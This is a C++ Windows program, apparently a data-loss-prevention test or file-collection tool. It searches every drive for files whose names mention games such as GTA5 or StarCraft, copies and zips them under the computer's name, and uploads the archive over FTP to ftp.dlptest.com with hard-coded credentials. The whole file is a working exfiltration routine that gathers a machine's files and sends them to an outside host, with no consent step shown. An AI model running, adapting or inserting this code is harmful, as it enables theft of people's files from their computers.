#include <iostream>
#include <io.h>
#include <vector>
#include <string>
#include <fcntl.h>
#include <locale>
#include <windows.h>
#include <shlobj.h>
#include <shellapi.h>
#include <wininet.h>
#include "zip.h"
#include "Util.h"

#pragma comment(lib, "wininet.lib")

using namespace std;

const int kMaxFileSize = 10 * 1024 * 1024;  // 10M

// 创建目录 C:\Users\Public\Documents\W\ 
wstring ReCreateTempPath()
{
    // Get the system documents directory
    PWSTR documentsPath = nullptr;
    HRESULT result = SHGetKnownFolderPath(FOLDERID_Documents, 0, nullptr, &documentsPath);
    if (result != S_OK)
    {
        std::wcout << L"Failed to get documents directory" << std::endl;
        return L"";
    }
    wstring tempPath = documentsPath;
    tempPath += L"\\W\\";

    // Delete the temp path and its all files
    DWORD attributes = GetFileAttributes(tempPath.c_str());
    if (attributes != INVALID_FILE_ATTRIBUTES && (attributes & FILE_ATTRIBUTE_DIRECTORY))
    {        
        if (!CUtil::DeleteFolder(tempPath))
        {            
            CoTaskMemFree(documentsPath);
            return L"";
        }
    }

    Sleep(1000); // 避免删掉目录马上创建目录失败

    // Create the full path of the temp path
    if (!CreateDirectory(tempPath.c_str(), nullptr))
    {
        std::wcout << L"Failed to create folder: " << tempPath << std::endl;
        CoTaskMemFree(documentsPath);
        return L"";
    }

    CoTaskMemFree(documentsPath);
    return tempPath;
}

vector<wstring> ScanGameFilesRecursive(const std::wstring& folderPath)
{
    vector<wstring> gameFiles;
    std::wstring searchPath = folderPath + L"\\*";

    WIN32_FIND_DATA findData;
    HANDLE hFind = FindFirstFile(searchPath.c_str(), &findData);

    if (hFind == INVALID_HANDLE_VALUE)
        return gameFiles;

    do
    {
        if (wcscmp(findData.cFileName, L".") != 0 && wcscmp(findData.cFileName, L"..") != 0)
        {
            std::wstring filePath = folderPath + L"\\" + findData.cFileName;

            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                // Recurse into subdirectory
                vector<wstring> files = ScanGameFilesRecursive(filePath);
                if (files.size() > 0)
                {
                    gameFiles.insert(gameFiles.end(), files.begin(), files.end());
                }
            } 
            else
            {
                wstring fileName = findData.cFileName;
                if (fileName.find(L".dll") == -1 &&
                    fileName.find(L".exe") == -1 &&
                    (fileName.find(L"GTA5") != -1 ||
                        fileName.find(L"游戏") != -1 ||
                        fileName.find(L"Games") != -1 ||
                        fileName.find(L"星际争霸") != -1) &&
                    findData.nFileSizeLow <= kMaxFileSize)
                {
                    gameFiles.push_back(filePath);
                    std::wcout << filePath << std::endl;
                }
            }
        }
    } while (FindNextFile(hFind, &findData));

    FindClose(hFind);
    return gameFiles;
}

vector<wstring> ScanGameFiles()
{
    vector<wstring> gameFiles;
    WCHAR drive[3] = L"A:";
    while (drive[0] <= L'Z')
    {       
        vector<wstring> files = ScanGameFilesRecursive(drive);
        if (files.size() > 0)
        {
            gameFiles.insert(gameFiles.end(), files.begin(), files.end());
        }

        // Move to the next drive
        drive[0]++;
    }
    return gameFiles;
}

// 如果指定路径已经存在，在文件名前加索引
std::wstring GetUniqueFilePath(const std::wstring& filePath)
{
    std::wstring path = filePath.substr(0, filePath.find_last_of(L"\\")+1);
    std::wstring fileName = filePath.substr(filePath.find_last_of(L"\\") + 1);
    int index = 1;
    std::wstring uniqueFilePath = filePath;
    while (CUtil::IsFileExist(uniqueFilePath))
    {
        uniqueFilePath = path + L"[" + std::to_wstring(index) + L"]" + fileName;
        index++;
    }

    return uniqueFilePath;
}

bool CopyGameFiles(const vector<wstring>& gameFiles, const wstring& destPath)
{
    for (auto& gameFile : gameFiles)
    {
        std::wstring destinationFilePath = destPath + L"\\" + gameFile.substr(gameFile.find_last_of(L"\\") + 1);
        destinationFilePath = GetUniqueFilePath(destinationFilePath);
        if (!CopyFile(gameFile.c_str(), destinationFilePath.c_str(), TRUE))
        {
            DWORD errorCode = GetLastError();
            std::wcout << L"Failed to copy file: " << gameFile << L". Error code: " << errorCode << std::endl;
            return false;
        }
    }
    return true;
}

wstring GetZipFilePath()
{
    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    if (!GetComputerName(computerName, &size))
    {
        DWORD errorCode = GetLastError();
        std::wcout << L"Failed to get computer name. Error code: " << errorCode << std::endl;
        return L"";
    }

    SYSTEMTIME currentTime;
    GetLocalTime(&currentTime);

    wchar_t tempPath[MAX_PATH];
    DWORD result = GetTempPath(MAX_PATH, tempPath);
    if (result <= 0)
    {
        DWORD errorCode = GetLastError();
        std::wcerr << L"Failed to get system temporary path. Error code: " << errorCode << std::endl;
        return L"";
    }

    wchar_t zipFilePath[MAX_PATH];
    swprintf_s(zipFilePath, MAX_PATH, L"%sW_%s_%d%d%d.zip", tempPath, computerName, 
        currentTime.wYear, currentTime.wMonth, currentTime.wDay);

    return zipFilePath;
}

bool ZipGameFiles(const wstring& gameFilePath, const wstring& zipFilePath)
{
    vector<wstring> gameFiles = CUtil::ListFiles(gameFilePath);
    if (gameFiles.empty())
    {
        wcout << L"not any game files, not need to zip them" << endl;
        return true;
    }

    string zipFilePathUtf8 = CUtil::WstringToUtf8(zipFilePath);

    // Delete the zip file first
    if (DeleteFile(zipFilePath.c_str()))
    {
        Sleep(1000);  // 避免马上创建失败
    }

    // Open the zip file for writing
    int error;
    zip* archive = zip_open(zipFilePathUtf8.c_str(), ZIP_CREATE | ZIP_EXCL, &error);
    if (!archive)
    {
        std::wcout << L"Failed to create the zip file : " << zipFilePath << L". Error is " << error << std::endl;
        return false;
    }

    // Add files from the folder to the zip archive
    for (auto& gameFile : gameFiles)
    {
        zip_source* source = zip_source_win32w_create(gameFile.c_str(), 0, -1, nullptr);
        if (!source)
        {
            std::wcout << L"Failed to create the zip source : " << gameFile << std::endl;
            zip_close(archive);
            return false;
        }

        string gameFileUtf8 = CUtil::WstringToUtf8(gameFile);
        const std::string entryName = gameFileUtf8.substr(gameFileUtf8.find_last_of("\\") + 1);
        zip_int64_t result = zip_file_add(archive, entryName.c_str(), source, ZIP_FL_ENC_UTF_8| ZIP_FL_OVERWRITE);
        if (result < 0)
        {
            std::wcout << L"Failed to add the file to the zip archive : " << gameFile << std::endl;
            zip_source_free(source);
            zip_close(archive);
            return false;
        }
    }    

    // Commit the changes and close the zip archive
    error = zip_close(archive);
    if (error != 0)
    {
        std::wcout << L"Failed to save zip file, error is " << error << std::endl;        
        return false;
    }

    return true;
}

bool UploadGameFiles(const wstring& zipFilePath)
{
    ULONGLONG zipFileSize = 0;
    if (!CUtil::GetFileSize(zipFilePath, zipFileSize) || zipFileSize > 100 * 1024 * 1024)
    {
        std::wcout << L"the size of the zip file is not less than 100M" << std::endl;
        return false;
    }

    wstring ftpServer = L"ftp.dlptest.com";
    INTERNET_PORT ftpPort = INTERNET_DEFAULT_FTP_PORT;
    wstring userName = L"dlpuser";
    wstring password = L"rNrKYTX9g7z3RgJRmxWuGHbeu";

    HINTERNET hInternet = InternetOpen(nullptr, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL)
    {
        std::cerr << "Failed to initialize WinINet" << std::endl;
        return false;
    }

    HINTERNET hFtpSession = InternetConnect(hInternet, ftpServer.c_str(), ftpPort, userName.c_str(), 
        password.c_str(), INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
    if (hFtpSession == NULL)
    {
        std::cerr << "Failed to connect to FTP server, error is " << GetLastError() << std::endl;
        InternetCloseHandle(hInternet);
        return false;
    }

    wstring remoteFileName = zipFilePath.substr(zipFilePath.find_last_of(L"\\") + 1);
    if (!FtpPutFileW(hFtpSession, zipFilePath.c_str(), remoteFileName.c_str(), FTP_TRANSFER_TYPE_BINARY, 0))
    {
        std::cerr << "Failed to upload file to FTP server, error is " << GetLastError() << std::endl;
        InternetCloseHandle(hFtpSession);
        InternetCloseHandle(hInternet);
        return false;
    }

    InternetCloseHandle(hFtpSession);
    InternetCloseHandle(hInternet);
    return true;
}

int main()
{
    // Set console output mode to Unicode
    _setmode(_fileno(stdout), _O_U16TEXT);

    wstring tempPath = ReCreateTempPath();
    if (tempPath.empty())
    {
        return 0;
    }

    wcout << L"scan game files..." << endl;

    vector<wstring> gameFiles = ScanGameFiles();
    if (gameFiles.empty())
    {
        wcout << L"not found any game files" << endl;
        return 0;
    }

    wcout << L"copy game files..." << endl;

    if (!CopyGameFiles(gameFiles, tempPath))
    {
        return 0;
    }

    wcout << L"package game files..." << endl;

    wstring zipFilePath = GetZipFilePath();
    if (zipFilePath.empty())
    {
        return 0;
    }    
    if (!ZipGameFiles(tempPath, zipFilePath))
    {
        return 0;
    }

    wcout << L"upload game files..." << endl;
    wcout << zipFilePath << endl;

    if (!UploadGameFiles(zipFilePath))
    {
        return 0;
    }

    wcout << L"done" << endl;
    return 1;
}